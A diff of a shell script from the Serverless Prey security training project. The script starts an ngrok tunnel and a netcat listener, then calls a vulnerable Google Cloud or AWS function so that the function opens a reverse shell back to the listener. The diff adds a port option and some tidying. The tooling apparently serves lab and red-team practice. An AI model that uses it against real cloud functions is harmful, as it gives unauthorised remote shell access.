@@ -1,5 +1,16 @@
 #!/bin/sh
 
+echo "
+  @@@@@@@@((.                                                        ((@@@@@@@@
+   *@@@@@@(/*#@%,                                               %&@(*/(@@@@@@/
+     (@@@@@(*.#%&@*/(                                       //*@&%#.*(@@@@@(
+       /@@@@@(***//(&&&%.                               .%&&&(//***(@@@@@%
+          #&@@@@@@&&&&&&&&&                           %&&&&&&&&@@@@@@&#
+
+                                 Serverless Prey
+                 https://github.com/pumasecurity/serverless-prey
+"
+
 # Enable job control.
 set -m
 
@@ -37,6 +48,12 @@ do
         shift # past value
         ;;
 
+        -p|--port)
+        LISTENER_PORT="$2"
+        shift # past argument
+        shift # past value
+        ;;
+
         -r|--region)
         REGION="$2"
         shift # past argument
@@ -51,14 +68,16 @@ do
     esac
 done
 
-if [[ -z $URL_ID ]]
+LISTENER_PORT="${LISTENER_PORT:-4444}"
+
+if [[ -z "$URL_ID" ]]
 then
-    echo 'usage: cheetah/cougar/panther [--url-id/-u PROJECT_ID/URL_ID] [--api-key/-a API_KEY] [--region/-r REGION] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]'
+    echo 'usage: cheetah/cougar/panther [--url-id/-u PROJECT_ID/URL_ID] [--api-key/-a API_KEY] [--region/-r REGION_OVERRIDE] [--port/-p LISTENER_PORT_DEFAULT_4444] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]'
     exit
 fi
 
 # Run ngrok and derive the public-facing host and port it is using.
-ngrok tcp 4444 --log stdout > /tmp/ngrok_output.txt 2>&1 &
+ngrok tcp "$LISTENER_PORT" --log stdout > /tmp/ngrok_output.txt 2>&1 &
 sleep 3
 
 if ! ps -p $! >&-
@@ -79,7 +98,7 @@ fi
 
 case $MODE in
     cheetah)
-    REGION=${REGION:-us-central1}
+    REGION="${REGION:-us-central1}"
     URL="https://$REGION-$URL_ID.cloudfunctions.net/Cheetah?host=$NGROK_HOST&port=$NGROK_PORT"
     ;;
 
@@ -88,16 +107,16 @@ case $MODE in
     ;;
 
     panther)
-    REGION=${REGION:-us-east-1}
+    REGION="${REGION:-us-east-1}"
     URL="https://$URL_ID.execute-api.$REGION.amazonaws.com/dev/api/Panther?host=$NGROK_HOST&port=$NGROK_PORT"
     ;;
 esac
 
 JOB=2
 
-while ! [[ -z $LOOP ]] || [[ $JOB -eq 2 ]]
+while ! [[ -z "$LOOP" ]] || [[ $JOB -eq 2 ]]
 do
-    nc -l 4444 &
+    nc -l "$LISTENER_PORT" &
 
     # Invoke the function with an HTTP call, connecting the reverse shell to the Netcat listener.
     curl -s "$URL" -H "X-API-Key: $API_KEY" > /tmp/curl_output.txt &
@@ -131,8 +150,9 @@ do
     echo 'Connection terminated.'
     JOB=$(($JOB + 2))
 
-    if ! [[ -z $LOOP ]]
+    if ! [[ -z "$LOOP" ]]
     then
+        rm /tmp/curl_output.txt
         echo 'Restarting...'
     fi
 done
